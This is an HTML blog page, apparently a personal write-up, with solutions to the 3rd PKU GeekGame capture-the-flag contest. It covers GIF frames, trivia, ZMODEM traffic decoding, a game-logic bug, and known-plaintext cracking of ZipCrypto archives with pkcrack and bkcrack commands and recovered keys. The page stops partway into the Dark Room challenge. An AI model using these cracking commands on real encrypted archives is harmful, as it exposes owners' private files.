@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_lulu_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_lulu_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"gcc314.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第三次打GeekGame了啊。时间过得真快，令人感叹。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3rd PKU GeekGame Writeup">
+<meta property="og:url" content="http://gcc314.top/2023/10/22/3rd-PKU-GeekGame-Writeup/index.html">
+<meta property="og:site_name" content="GCC314&#39;s BLOG">
+<meta property="og:description" content="第三次打GeekGame了啊。时间过得真快，令人感叹。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2023/10/22/unLCyWJKfvFaMbN.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/xiaobei_5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/osint-challenge.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_failed.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob24.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob16_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob16_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob16_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob22_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob22_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob22_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob02_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob02_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob02_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob25_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob20_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/smgg.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/lulu.jpg">
+<meta property="article:published_time" content="2023-10-22T11:46:51.000Z">
+<meta property="article:modified_time" content="2023-10-22T12:11:49.010Z">
+<meta property="article:author" content="GCC314">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/10/22/unLCyWJKfvFaMbN.png">
+
+<link rel="canonical" href="http://gcc314.top/2023/10/22/3rd-PKU-GeekGame-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>3rd PKU GeekGame Writeup | GCC314's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">GCC314's BLOG</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://gcc314.top/2023/10/22/3rd-PKU-GeekGame-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/g-avatar.jpg">
+      <meta itemprop="name" content="GCC314">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GCC314's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          3rd PKU GeekGame Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-22 19:46:51 / Modified: 20:11:49" itemprop="dateCreated datePublished" datetime="2023-10-22T19:46:51+08:00">2023-10-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第三次打GeekGame了啊。时间过得真快，令人感叹。</p>
+<span id="more"></span>
+
+
+
+<p><code>参赛昵称: 雫るる今天吃一德格拉米</code></p>
+<p><code>日期: 2023.10.21</code></p>
+<p><code>环境: KUbuntu 22.04 + Windows 10</code></p>
+<p>放个排名截图纪念一下。</p>
+<p><img src="https://s2.loli.net/2023/10/22/unLCyWJKfvFaMbN.png" alt="图片.png"></p>
+<h2 id="一眼盯帧"><a href="#一眼盯帧" class="headerlink" title="一眼盯帧"></a>一眼盯帧</h2><p>可以看到得到的gif图像的每一帧上面都有一个字符，我们需要把gif的每一帧图像给取出来，new bing says:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert prob23-signin.gif -coalesce %d.png</span><br></pre></td></tr></table></figure>
+
+<p>于是我们得到了24张图，把每一帧的图合起来得到一个字串:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;jrypbzrarjcynlref&#125;</span><br></pre></td></tr></table></figure>
+
+<p>做一下凯撒密码，得到原串(offset&#x3D;13):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcomenewplayers&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="小北问答"><a href="#小北问答" class="headerlink" title="小北问答!!!!!"></a>小北问答!!!!!</h2><blockquote>
+<p>在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？                        </p>
+</blockquote>
+<p>由<a target="_blank" rel="noopener" href="https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html">https://hpc.pku.edu.cn/_book&#x2F;guide&#x2F;slurm&#x2F;slurm.html</a>得到答案为<code>sbatch</code>。</p>
+<blockquote>
+<p>根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？</p>
+</blockquote>
+<p>先在<a target="_blank" rel="noopener" href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource">https://github.com/MiCode/Xiaomi_Kernel_OpenSource</a>中找到 Redmi K60 Ultra 对应的branch: <code>corot-t-oss</code>，然后在<a target="_blank" rel="noopener" href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss">https://github.com/MiCode/Xiaomi_Kernel_OpenSource&#x2F;tree&#x2F;corot-t-oss</a>找到他的Makefile:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0</span></span><br><span class="line">VERSION = 5</span><br><span class="line">PATCHLEVEL = 15</span><br><span class="line">SUBLEVEL = 78</span><br><span class="line">EXTRAVERSION =</span><br><span class="line"><span class="comment"># ... ...</span></span><br></pre></td></tr></table></figure>
+
+<p>于是答案为<code>5.15.78</code>。</p>
+<blockquote>
+<p>每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 <code>iPhone1,1</code>。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？</p>
+</blockquote>
+<p>在页面<a target="_blank" rel="noopener" href="https://gist.github.com/adamawolf/3048717">https://gist.github.com/adamawolf/3048717</a>，我们可以找到答案为<code>Watch6,16</code>。</p>
+<blockquote>
+<p>本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）</p>
+</blockquote>
+<p>可恶😡这b题目怎么还和Python版本有关的啊，令人感叹。</p>
+<p>我们可以在<a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/gs-backend/blob/master/src/store/user_profile_store.py">https://github.com/PKU-GeekGame/gs-backend/blob/master/src/store/user_profile_store.py</a>中找到后端的处理逻辑:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicategories <span class="keyword">import</span> categories</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> TYPE_CHECKING, <span class="type">Optional</span>, <span class="type">Set</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_chars</span>(<span class="params">*cats: <span class="built_in">str</span></span>) -&gt; <span class="type">Set</span>[<span class="built_in">str</span>]:</span><br><span class="line">    ret = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> cat <span class="keyword">in</span> cats:</span><br><span class="line">        ret |= <span class="built_in">set</span>(categories[cat].characters())</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># ... ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://unicode.org/reports/tr51/proposed.html</span></span><br><span class="line">    EMOJI_CHARS = (</span><br><span class="line">        &#123;<span class="built_in">chr</span>(<span class="number">0x200d</span>)&#125;  <span class="comment"># zwj</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(<span class="number">0x200b</span>)&#125;  <span class="comment"># zwsp, to break emoji componenets into independent chars</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(<span class="number">0x20e3</span>)&#125; <span class="comment"># keycap</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xfe00</span>, <span class="number">0xfe0f</span>+<span class="number">1</span>)&#125; <span class="comment"># variation selector</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xe0020</span>, <span class="number">0xe007f</span>+<span class="number">1</span>)&#125; <span class="comment"># tag</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1f1e6</span>, <span class="number">0x1f1ff</span>+<span class="number">1</span>)&#125; <span class="comment"># regional indicator</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.compart.com/en/unicode/category</span></span><br><span class="line">    DISALLOWED_CHARS = (</span><br><span class="line">        unicode_chars(<span class="string">&#x27;Cc&#x27;</span>, <span class="string">&#x27;Cf&#x27;</span>, <span class="string">&#x27;Cs&#x27;</span>, <span class="string">&#x27;Mc&#x27;</span>, <span class="string">&#x27;Me&#x27;</span>, <span class="string">&#x27;Mn&#x27;</span>, <span class="string">&#x27;Zl&#x27;</span>, <span class="string">&#x27;Zp&#x27;</span>) <span class="comment"># control and modifier chars</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x12423</span>, <span class="number">0x12431</span>+<span class="number">1</span>)&#125; <span class="comment"># too long</span></span><br><span class="line">        | &#123;<span class="built_in">chr</span>(<span class="number">0x0d78</span>)&#125; <span class="comment"># too long</span></span><br><span class="line">    ) - EMOJI_CHARS</span><br><span class="line">    WHITESPACE_CHARS = unicode_chars(<span class="string">&#x27;Zs&#x27;</span>) | EMOJI_CHARS</span><br><span class="line">   </span><br><span class="line"><span class="comment"># ... ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>DISALLOWED_CHARS</code>就是大家想要的东西，但是在我的<code>Python 3.10</code>下跑出来的结果是<code>4472</code>。</p>
+<p>最后用<code>Python 3.8</code>才跑出正确答案<code>4445</code>。</p>
+<blockquote>
+<p>在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）</p>
+</blockquote>
+<p>在<a target="_blank" rel="noopener" href="https://web.archive.org/">web.archive.org</a>上找了好久，才看到这个2011.09.01的页面:</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/xiaobei_5.png"></p>
+<p>得到答案是<code>游戏视频,游戏攻略·解说,Mugen,flash游戏</code>。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://prob18.geekgame.pku.edu.cn/static/osint-challenge.jpg">这个照片</a>中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/osint-challenge.jpg"></p>
+</blockquote>
+<p>先把图上带英文的机构名称<code>tuspark zpark konza kacst</code>一起搜一遍，找到这样一篇报道<a target="_blank" rel="noopener" href="https://www.iasp.ws/activities/news/our-fantastic-partners-at-iasp2023-luxembourg">https://www.iasp.ws/activities/news/our-fantastic-partners-at-iasp2023-luxembourg</a>，大概是在Luxembourg举办的某个组织的某个活动。在IASP的官网的News中我们还能找到别的带有这个建筑物的报道，比如<a target="_blank" rel="noopener" href="https://www.iasp.ws/activities/news/an-exciting-social-programme-awaits-our-guests-at-iasp-2023">https://www.iasp.ws/activities/news/an-exciting-social-programme-awaits-our-guests-at-iasp-2023</a>，里面提到这个建筑物是Luxembourg Philharmonie。我们查询他的官网可以得到答案为<code>philharmonie.lu</code>。</p>
+<p>于是得到两个flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dang-ran-li-jie-ni-xin-zhong,&#125;</span><br><span class="line">flag&#123;kenn-dingg-xiangg-zaii-woo-shou-zhoongg~~~&#125;</span><br></pre></td></tr></table></figure>
+
+<p><del>我超我怎么是校内一血</del> <del>Python你害人不浅</del></p>
+<h2 id="Z-公司的服务器"><a href="#Z-公司的服务器" class="headerlink" title="Z 公司的服务器"></a>Z 公司的服务器</h2><p>虽然给了流量包，但感觉协议不大好猜。原本以为是FTP但不是，搜了好久<code>File Protocol</code>都没找到合适的。结果第一阶段最后一小时忽然灵感来了:</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_1.png"></p>
+<p>这个Server给Client发的第一个包，该不会就是<code>rz\r</code>吧（噔 噔 咚）</p>
+<p>我去，真是！</p>
+<p>于是搜了一下<code>rz</code>，原来<code>rz</code>和<code>sz</code>是一组利用<code>ZMODEM</code>协议的传输文件的工具。然后我尝试<code>nc</code>到了服务器，结果就忽然弹出一个选择文件下载路径的窗口：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_2.png"></p>
+<p>于是拿到了第一个flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Anc1enT_tr4nsf3R_pr0tOcOI_15_57111_in_u5e_t0d4y&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后一小时极限过题，<del>我疑似是天才？</del></p>
+<p>原本想把第二问也拿下的，但这个ZMODEM文档疑似有点恶心了，所以只能第二阶段解了。</p>
+<p>看了很久文档<a target="_blank" rel="noopener" href="http://wiki.synchro.net/ref:zmodem">http://wiki.synchro.net/ref:zmodem</a>，我们需要解出的是Client收到的<code>ZDATA</code>段的内容，也就是这里面大小比较大的这几个包的内容。</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_3.png"></p>
+<p>我们把hex dump导到文件<code>zdata_raw.txt</code>，Prettify一下以便人眼阅读，得到<code>zdata_ptf.txt</code>。我们可以在数据的前面找到<code>ff d8</code>，在结尾找到<code>ff d9</code>，然后我们截取这两者之间的部分得到<code>zdata_ptf_inner.txt</code>。接下来我们就需要从中提取我们的jpg。</p>
+<p>也许是我的英语阅读能力太烂了，又或许是这个文档写的有点烂，反正这个阅读理解我做了很久。首先，因为文档里出现了很多<code>18</code>，我们可以注意到，文档里说明<code>18</code>代表了对后一个字符的转义，<code>18 xx</code>代表了<code>xx ^ 0x40</code>。转义完之后，我们得到了一些奇怪的东西：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05_failed.jpg"></p>
+<p>我们隐约可以辨认出<code>flag&#123;</code>的字样，这说明我们的大方向是对的，但是少部分细节的处理有问题。</p>
+<p>看了更久之后，我又看到了关于块结尾的规则：如果看到了<code>18 69</code>，说明来到了块结尾，之后会有4字节的CRC，接着是下一块的数据。我们把<code>18 69</code>和后面的CRC给去掉，就得到了正解:</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob05.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;traFf1c_aNa1y51s_4_ZMODEM&#125;</span><br></pre></td></tr></table></figure>
+
+<p><del>暴露了自己阅读理解能力低下的事实</del></p>
+<h2 id="基本功"><a href="#基本功" class="headerlink" title="基本功"></a>基本功</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>我们先查看<code>challenge_1.zip</code>的内容，里面是一个<code>chromedriver_linux64.zip</code>和一个<code>flag1.txt</code>。可以猜想是明文攻击。我们需要找到对应版本的<code>chromedriver_linux64.zip</code>，于是我写了一个脚本<code>ck.mjs</code>从<a target="_blank" rel="noopener" href="https://chromedriver.storage.googleapis.com/?delimiter=/&prefix=xxx/">https://chromedriver.storage.googleapis.com/?delimiter=/&prefix=xxx/</a>获得zip文件对应的size，可以发现版本89.0.4389.23大小为5845152，正好是我们要的压缩包。我们用工具pkcrack：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/pkcrack -c <span class="string">&quot;chromedriver_linux64.zip&quot;</span> -p chromedriver_linux64.zip -C challenge_1.zip -P build/c_1.zip -d decrypt.zip</span><br></pre></td></tr></table></figure>
+
+<p>（其中c_1.zip的内容是chromedriver_linux64.zip），得到了decrypt.zip，其中的flag1.txt就有我们的flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Insecure-Zip-Crypto-From-Known-File-Contents&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><code>challenge_2.zip</code>中只有一个文件<code>flag2.pcapng</code>，我们应该找到pcapng文件的格式并进行明文攻击，但我一开始找成pcap文件以至于第一阶段没能解压出来😭</p>
+<p>在<a target="_blank" rel="noopener" href="https://pcapng.com/#SHB_BlockType">https://pcapng.com/#SHB_BlockType</a>我们看到pcapng文件的开头有如下格式:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0a 0d 0d 0a .. .. .. .. 4d 3c 2b 1a .. .. .. ..</span><br><span class="line">ff ff ff ff ff ff ff ff .. .. .. .. </span><br></pre></td></tr></table></figure>
+
+<p>我们可以确定文件[0:4],[8:12],[16:24]的内容，这样我们就可以用bkcrack来明文攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../bkcrack/build/src/bkcrack -C challenge_2.zip -c flag2.pcapng -p h.bin -o 16 -x 0 0a0d0d0a -x 8 4d3c2b1a</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>h.bin</code>包含了8个字节的<code>ff</code>。我跑了好几个小时终于跑出了一组key:<code>83831826 8f38e78b 139998e6</code>。</p>
+<p>然后解密并解压:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../bkcrack/build/src/bkcrack -C challenge_2.zip -c flag2.pcapng -k 83831826 8f38e78b 139998e6 -d dec</span><br><span class="line">python3 ../bkcrack/tools/inflate.py &lt; dec &gt; dec.pcapng</span><br></pre></td></tr></table></figure>
+
+<p>然后在得到的pcapng文件中，我们找到如下内容:</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob24.png"></p>
+<p>这便是我们的flag2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;inSecUrE-zip-crypTO-eVeN-withOuT-KNOWN-fiLe-CoNtENT&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Dark-Room"><a href="#Dark-Room" class="headerlink" title="Dark Room"></a>Dark Room</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>地图大致长这个样子：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob16_1.png"></p>
+<p>其中拿Trinket和Latte对Sanity有增益，拿道具和开门的动作也对Sanity有增益，但Sanity也会随着操作次数而下降。还有一个Help操作可以有一定几率增加Sanity，但有一定几率减少Sanity。第一个flag的目标是以117%以上的Sanity过关。而理论上不Help时最优的操作到结尾也不能让Sanity高于100%。</p>
+<p>我一开始想的做法是写个自动脚本，每次在Door 2前Help，直到Sanity足够。但是我跑了一会感觉几率太低，于是就玉玉开摆了。结果第一阶段最后一天（又是这天x）我看源代码的时候看到（<a target="_blank" rel="noopener" href="https://github.com/tinichu316/Dark_Room/blob/master/player.py">https://github.com/tinichu316/Dark_Room&#x2F;blob&#x2F;master&#x2F;player.py</a>，Line 163）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">useItemTarget</span>(<span class="params">self, item</span>):</span><br><span class="line">    target = self.location</span><br><span class="line">    doorCheck = item[<span class="string">&#x27;doorCheck&#x27;</span>]</span><br><span class="line">    item = item[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">    <span class="comment">#target is the player&#x27;s room [x,y]</span></span><br><span class="line">    <span class="comment"># doorCheck is what the player wants to use the item with (confusing, I know)</span></span><br><span class="line">    targetRoom = world.tileExists(target[<span class="number">0</span>],target[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> item == <span class="string">&quot;key&quot;</span> <span class="keyword">and</span> doorCheck == <span class="string">&quot;door&quot;</span>:</span><br><span class="line">        keyType = <span class="number">0</span> <span class="comment">#1 is key 1, 2 is both keys</span></span><br><span class="line">        <span class="keyword">if</span> self.inventory[<span class="number">4</span>]:</span><br><span class="line">            keyType = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> self.inventory[<span class="number">3</span>]:</span><br><span class="line">            keyType = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You don&#x27;t have a key!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> targetRoom.doorType == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;There&#x27;s no door here to unlock.\n&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> keyType == targetRoom.doorType <span class="keyword">or</span> keyType == <span class="number">2</span>:</span><br><span class="line">            targetRoom.unlock()</span><br><span class="line">            self.sanity += <span class="number">3</span> <span class="comment"># !!! !!!</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;That key doesn&#x27;t fit here.\n&quot;</span>)</span><br><span class="line">    <span class="comment"># ... ...</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到你可以重复开门来刷Sanity，于是我们愉悦过关，得到了flag1:</p>
